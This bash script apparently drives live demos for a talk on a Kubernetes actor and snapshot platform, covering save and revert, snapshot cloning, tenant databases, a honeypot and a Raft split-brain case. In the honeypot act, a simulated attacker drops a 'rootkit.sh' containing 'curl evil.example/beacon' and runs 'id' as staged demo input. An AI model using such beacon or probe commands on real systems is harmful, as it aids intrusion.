#!/usr/bin/env bash
# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Live-stage runner & deployer for the "Running Anything But Agents on Substrate" talk.
#
# Usage:
#   ./hack/stage-demo.sh deploy          # Build & deploy WorkerPool + all 5 ActorTemplates
#   ./hack/stage-demo.sh act1-dungeon    # Live Demo 1: "Look Ma, No Database" + Save-Scumming (revert & tag)
#   ./hack/stage-demo.sh act2-coldstart  # Live Demo 2: "The Instant Cloner" (12s cold boot -> 100ms clones)
#   ./hack/stage-demo.sh act3-tenantdb   # Live Demo 3: "One DB Per User" (DurableDir + FULLPause/DATACommit)
#   ./hack/stage-demo.sh act4-honeypot   # Live Demo 4: "The Truman Show Honeypot" (per-IP gVisor deception)
#   ./hack/stage-demo.sh act5-timewarp   # Live Demo 5: "Don't Try This at Home" (Time-Jump & Raft Split-Brain)
#   ./hack/stage-demo.sh cleanup         # Tear down all demo resources

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ATESPACE="anything-but-agents"
ROUTER_URL="${ROUTER_URL:-http://localhost:8000}"
PAUSE_BETWEEN_STEPS="${PAUSE_BETWEEN_STEPS:-1}"

# If sitting inside a parent b-substrate checkout with .ate-dev-env.sh, source it automatically.
if [[ -z "${BUCKET_NAME:-}" && -f "${REPO_ROOT}/../.ate-dev-env.sh" ]]; then
  # shellcheck disable=SC1091
  source "${REPO_ROOT}/../.ate-dev-env.sh"
fi

banner() {
  echo ""
  echo -e "\033[1;36m================================================================================\033[0m"
  echo -e "\033[1;36m  $*\033[0m"
  echo -e "\033[1;36m================================================================================\033[0m"
}

step() {
  echo ""
  echo -e "\033[1;33m>>> $*\033[0m"
  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    read -r -p "    [Press Enter to execute] " _
  fi
}

run_cmd() {
  echo -e "\033[1;32m$ $*\033[0m"
  "$@"
}

detect_cluster_defaults() {
  if [[ -z "${BUCKET_NAME:-}" ]]; then
    echo "Error: BUCKET_NAME must be set (e.g. export BUCKET_NAME=my-snapshot-bucket)" >&2
    exit 1
  fi
  if [[ -z "${SUBSTRATE_VERSION:-}" ]]; then
    SUBSTRATE_VERSION="$(kubectl get nodes -o jsonpath='{.items[0].metadata.labels.ate\.dev/substrate-version}' 2>/dev/null || true)"
  fi
  if [[ -z "${ATEOM_GVISOR_IMAGE:-}" ]]; then
    # Discover an existing ateom-gvisor image from the cluster if one is already deployed,
    # or fall back to ko:// reference if building from a substrate checkout.
    ATEOM_GVISOR_IMAGE="$(kubectl get workerpools -A -o jsonpath='{.items[0].spec.workerImage}' 2>/dev/null || true)"
    if [[ -z "${ATEOM_GVISOR_IMAGE}" ]]; then
      ATEOM_GVISOR_IMAGE="ko://github.com/agent-substrate/substrate/cmd/ateom-gvisor"
    fi
  fi
  export BUCKET_NAME SUBSTRATE_VERSION ATEOM_GVISOR_IMAGE
}

deploy_all() {
  detect_cluster_defaults
  banner "Deploying 'Anything But Agents' WorkerPool & 5 ActorTemplates"

  echo "Using BUCKET_NAME=${BUCKET_NAME}"
  echo "Using SUBSTRATE_VERSION=${SUBSTRATE_VERSION}"
  echo "Using ATEOM_GVISOR_IMAGE=${ATEOM_GVISOR_IMAGE}"

  envsubst < "${REPO_ROOT}/manifests/workerpool.yaml.tmpl" | kubectl apply -f -
  kubectl rollout status deployment/anything-but-agents -n anything-but-agents --timeout=180s

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true

  for tmpl in dungeon coldstart tenantdb honeypot timewarp; do
    echo ""
    echo "--- Building & registering ActorTemplate: ${tmpl} ---"
    (
      cd "${REPO_ROOT}"
      envsubst < "manifests/${tmpl}-template.yaml.tmpl" \
        | ko resolve -f - \
        | kubectl ate create actor-template -f -
    )
  done

  echo ""
  echo "Waiting for Golden Snapshots (coldstart takes ~12s by design to precompute its heap)..."
  kubectl ate get actor-templates -a "${ATESPACE}"
}

act1_dungeon() {
  banner "ACT I: 'Look Ma, No Database' — Zork Dungeon in Pure Process RAM"

  step "1. Create hero actor 'hero-mofi' from the 'dungeon' template"
  run_cmd kubectl ate create actor hero-mofi -a "${ATESPACE}" --template dungeon

  step "2. Wake the actor with an HTTP request & look around the Tavern"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=look"

  step "3. Move to the Armory and pick up ONLY the dragon-slayer-sword (forgetting the fire-shield!)"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=move+armory"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=take+dragon-slayer-sword"

  step "4. Move into the Cavern of the Heap Dragon"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=move+dragon-lair"

  step "5. QUICKSAVE! Suspend the actor to GCS (persisting Go heap variables) and tag the snapshot 'before-dragon'"
  run_cmd kubectl ate suspend actor hero-mofi -a "${ATESPACE}"
  run_cmd kubectl ate create tag before-dragon -a "${ATESPACE}" --actor hero-mofi

  step "6. Recklessly attack the Heap Dragon without the fire-shield -> YOU DIE (PlayerHP = 0 in RAM)"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=attack"

  step "7. SAVE-SCUMMING! Revert the running actor back to its last external snapshot (`kubectl ate revert`)"
  run_cmd kubectl ate revert actor hero-mofi -a "${ATESPACE}"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=look"

  step "8. Bonus: Fork a parallel timeline ('hero-timeline-b') from the 'before-dragon' tag!"
  run_cmd kubectl ate create actor hero-timeline-b -a "${ATESPACE}" --template dungeon --tag before-dragon
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/hero-timeline-b" "${ROUTER_URL}/?cmd=move+armory"
}

act2_coldstart() {
  banner "ACT II: 'The Instant Cloner' — Skipping a 12-Second Cold Start via Golden Snapshots"

  step "1. Create 3 separate actors from the 'coldstart' template (whose Golden Snapshot already ran the 12s prime sieve)"
  run_cmd kubectl ate create actor clone-1 -a "${ATESPACE}" --template coldstart
  run_cmd kubectl ate create actor clone-2 -a "${ATESPACE}" --template coldstart
  run_cmd kubectl ate create actor clone-3 -a "${ATESPACE}" --template coldstart

  step "2. Query clone-1 and clone-2 — both wake in ~100ms with the SAME golden_heap_fingerprint and 78,498 primes in RAM!"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/clone-1" "${ROUTER_URL}/?add_symbol=user_a_module"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/clone-2" "${ROUTER_URL}/?add_symbol=user_b_module"
}

act3_tenantdb() {
  banner "ACT III: 'One Database Per Customer' — DurableDir + FULL Pause vs DATA Commit"

  step "1. Create two isolated single-tenant database actors: 'db-acme' and 'db-globex'"
  run_cmd kubectl ate create actor db-acme -a "${ATESPACE}" --template tenantdb
  run_cmd kubectl ate create actor db-globex -a "${ATESPACE}" --template tenantdb

  step "2. Insert rows into db-acme's DurableDir (/data/wal.jsonl) and warm its RAM counter"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/?key=tier&val=enterprise"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/?key=region&val=us-central1"

  step "3. PAUSE db-acme (onPause: FULL) -> resume it: both DurableDir rows AND ram_queries_since_boot survive!"
  run_cmd kubectl ate pause actor db-acme -a "${ATESPACE}"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/"

  step "4. SUSPEND db-acme (onCommit: DATA) -> resume it: DurableDir rows survive via WAL replay, while RAM cold-boots cleanly!"
  run_cmd kubectl ate suspend actor db-acme -a "${ATESPACE}"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/"

  step "5. GDPR Right-to-be-Forgotten in one command: delete tenant 'db-acme'"
  run_cmd kubectl ate delete actor db-acme -a "${ATESPACE}" --any-state
}

act4_honeypot() {
  banner "ACT IV: 'The Truman Show Honeypot' — On-Demand Per-Attacker gVisor Deception"

  step "1. Create honeypot actors for two suspicious scanner IPs"
  run_cmd kubectl ate create actor honeypot-203-0-113-5 -a "${ATESPACE}" --template honeypot
  run_cmd kubectl ate create actor honeypot-198-51-100-9 -a "${ATESPACE}" --template honeypot

  step "2. Attacker 203.0.113.5 'compromises' their sandbox and drops /tmp/honeypot/rootkit.sh"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" \
    "${ROUTER_URL}/?drop_file=rootkit.sh&content=curl+evil.example/beacon&cmd=id"

  step "3. Attacker disconnects -> suspend honeypot-203-0-113-5 to GCS ($0 compute while idle)"
  run_cmd kubectl ate suspend actor honeypot-203-0-113-5 -a "${ATESPACE}"

  step "4. Meanwhile, Attacker 198.51.100.9 probes the system and sees a completely clean filesystem"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/honeypot-198-51-100-9" "${ROUTER_URL}/"

  step "5. Weeks later, Attacker 203.0.113.5 returns — their sandbox wakes in ~100ms with rootkit.sh still in /tmp!"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" "${ROUTER_URL}/?cmd=ls+-la+/tmp/honeypot"
}

act5_timewarp() {
  banner "ACT V: 'Don't Try This at Home' — Wall-Clock Time-Jump Shock & Raft Split-Brain"

  step "1. Create 'raft-leader-1' from the 'timewarp' template and verify it is HEALTHY"
  run_cmd kubectl ate create actor raft-leader-1 -a "${ATESPACE}" --template timewarp
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/raft-leader-1" "${ROUTER_URL}/"

  step "2. Suspend 'raft-leader-1' for 5 seconds (longer than its 3-second leader lease TTL!)"
  run_cmd kubectl ate suspend actor raft-leader-1 -a "${ATESPACE}"
  echo "Sleeping 5 seconds while raft-leader-1 is frozen in object storage..."
  sleep 5

  step "3. Wake 'raft-leader-1' with an HTTP request and observe the Time-Travel Shock & Split-Brain Panic!"
  run_cmd curl -s -H "ate-target-actor: ${ATESPACE}/raft-leader-1" "${ROUTER_URL}/"
}

cleanup_all() {
  banner "Cleaning up 'Anything But Agents' resources"
  for actor in hero-mofi hero-timeline-b clone-1 clone-2 clone-3 db-acme db-globex honeypot-203-0-113-5 honeypot-198-51-100-9 raft-leader-1; do
    kubectl ate delete actor "${actor}" -a "${ATESPACE}" --any-state 2>/dev/null || true
  done
  kubectl ate delete tag before-dragon -a "${ATESPACE}" 2>/dev/null || true
  for tmpl in dungeon coldstart tenantdb honeypot timewarp; do
    kubectl ate delete actor-template "${tmpl}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl ate delete atespace "${ATESPACE}" 2>/dev/null || true
  kubectl delete namespace anything-but-agents --ignore-not-found
}

case "${1:-}" in
  deploy)        deploy_all ;;
  act1-dungeon)  act1_dungeon ;;
  act2-coldstart) act2_coldstart ;;
  act3-tenantdb) act3_tenantdb ;;
  act4-honeypot) act4_honeypot ;;
  act5-timewarp) act5_timewarp ;;
  cleanup)       cleanup_all ;;
  *)
    echo "Usage: $0 {deploy|act1-dungeon|act2-coldstart|act3-tenantdb|act4-honeypot|act5-timewarp|cleanup}" >&2
    exit 1
    ;;
esac
